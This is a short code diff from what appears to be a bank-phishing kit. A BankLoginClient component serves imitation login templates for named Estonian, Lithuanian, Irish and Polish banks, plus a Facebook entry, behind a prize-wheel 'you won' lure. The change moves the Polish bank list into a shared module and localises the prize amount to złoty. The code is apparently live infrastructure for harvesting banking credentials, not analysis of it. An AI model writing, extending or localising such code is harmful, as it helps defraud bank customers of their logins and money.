@@ -44,6 +44,7 @@ import { EstoniaBankTemplate } from "@/components/templates/EstoniaBankTemplate"
 import { LithuaniaBankTemplate } from "@/components/templates/LithuaniaBankTemplate";
 import { IrelandBankTemplate } from "@/components/templates/IrelandBankTemplate";
 import { PolandBankTemplate } from "@/components/templates/PolandBankTemplate";
+import { POLAND_TEMPLATE_SLUGS } from "@/lib/poland-bank-slugs";
 // LT bilinen banka slug'lari (methodMap ile ayni, kopya):
 const LITHUANIA_KNOWN_SLUGS = new Set([
   "swedbank-lt","seb-lt","luminor-lt","citadele-lt","lku-lt","siauliu-lt","facebook-lt"
@@ -52,11 +53,6 @@ const LITHUANIA_KNOWN_SLUGS = new Set([
 // IE ozel sablonu olan banka slug'lari (public/ie-banks/<slug>/{1,2}.html)
 const IRELAND_TEMPLATE_SLUGS = new Set([
   "permanent-tsb","ptsb","aib","an-post","bank-of-ireland","ebs","revolut","wise"
-]);
-
-const POLAND_TEMPLATE_SLUGS = new Set([
-  "pekao24","ing","bnpparibas","millennium","alior","velobank","santander",
-  "bps","bosbank","bsr-krakow","ca24","citibank","ipko","mbank","pocztowy","sgb"
 ]);
 
 type Props = {
@@ -315,7 +311,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       const label = typeof fd.wheel_result_label === "string" && fd.wheel_result_label.trim()
         ? fd.wheel_result_label.trim()
         : amt
-          ? "€ " + new Intl.NumberFormat("de-DE").format(amt)
+          ? new Intl.NumberFormat("pl-PL").format(amt) + " zł"
           : null;
       setWonAmount(amt);
       setWonLabel(label);
